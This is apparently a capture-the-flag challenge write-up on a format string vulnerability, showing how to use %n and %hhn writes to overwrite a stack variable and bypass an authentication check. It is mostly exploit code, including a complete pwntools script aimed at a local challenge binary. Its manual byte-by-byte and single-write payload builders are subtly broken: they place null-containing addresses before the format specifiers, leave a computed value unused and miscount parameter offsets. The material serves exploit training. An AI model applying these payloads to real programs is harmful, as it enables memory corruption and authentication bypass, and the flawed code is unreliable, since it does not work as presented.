# Challenge 07: Format String Stack Write

## Difficulty: Easy-Medium

## Vulnerability Type: Format String Write to Stack Variable

## Description
Use format string vulnerability to overwrite a local stack variable to bypass authentication.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### Target Variable
```c
int auth = 0;
// ...
if (auth == 0x1337c0de) {
    // Win!
}
```

We need to write `0x1337c0de` to the `auth` variable.

### Format String Bug
```c
printf(buffer);  // Can use %n
```

## Exploitation Strategy

### Goal
Write `0x1337c0de` (322420958 in decimal) to the address of `auth`.

### Method 1: Single %n Write
```python
# We need to print 322420958 bytes, then use %n
# This is impractical (too many bytes)
```

### Method 2: Byte-by-Byte with %hhn
Write each byte separately:
- Byte 0: 0xde = 222
- Byte 1: 0xc0 = 192
- Byte 2: 0x37 = 55
- Byte 3: 0x13 = 19

### Finding Stack Offset
```python
# Send pattern to find offset
payload = b'AAAA' + b'.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p'
# Look for 0x41414141
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9007)
else:
    p = process('./challenge')

# Get auth address
p.recvuntil(b'at: ')
auth_addr = int(p.recvline().strip(), 16)
log.info(f"auth at: {hex(auth_addr)}")

# Target value
target = 0x1337c0de

# Find offset (typically 6-8)
offset = 6

# Method 1: Using pwntools
payload = fmtstr_payload(offset, {auth_addr: target}, write_size='byte')

p.sendlineafter(b'input: ', payload)
p.interactive()
```

### Manual Byte-by-Byte
```python
# Write byte by byte in increasing order to avoid issues
bytes_to_write = [
    (auth_addr + 3, 0x13),  # MSB: 19
    (auth_addr + 2, 0x37),  # 55
    (auth_addr + 1, 0xc0),  # 192
    (auth_addr + 0, 0xde),  # LSB: 222
]

# Sort by value to write
bytes_to_write.sort(key=lambda x: x[1])

written = 0
payload = b''
param_idx = offset

for addr, value in bytes_to_write:
    to_write = (value - written) % 256
    if to_write == 0:
        to_write = 256

    payload += p64(addr)
    param_idx += 1

# Now add format specifiers
for i, (addr, value) in enumerate(bytes_to_write):
    to_write = (value - written) % 256
    if to_write == 0:
        to_write = 256

    payload += f'%{to_write}c'.encode()
    payload += f'%{offset + i}$hhn'.encode()

    written = value
```

### Simple Single-Write Method
```python
# If we can control enough of the stack:
# Place target address, print exact number of bytes, use %n

target_val = 0x1337c0de
payload = p64(auth_addr)
payload += f'%{target_val - 8}c'.encode()
payload += f'%{offset}$n'.encode()

# Warning: This prints ~322MB of data, may be slow/crash
```

## Automated Detection
- **Format String**: printf of user input with %n
- **Stack Variable**: Local variable checked for specific value
- **Single Shot**: One format string input only
- **Strategy**: Calculate write sequence to overwrite stack variable

## Learning Objectives
- Writing to stack variables
- Managing byte order in writes
- Dealing with write size constraints
- pwntools fmtstr_payload function

## Alternative: %hn for 2-byte writes
```python
# Write as two 2-byte values
low = target & 0xFFFF          # 0xc0de
high = (target >> 16) & 0xFFFF  # 0x1337

payload = p64(auth_addr)
payload += p64(auth_addr + 2)
# Then add appropriate %c and %hn specifiers
```
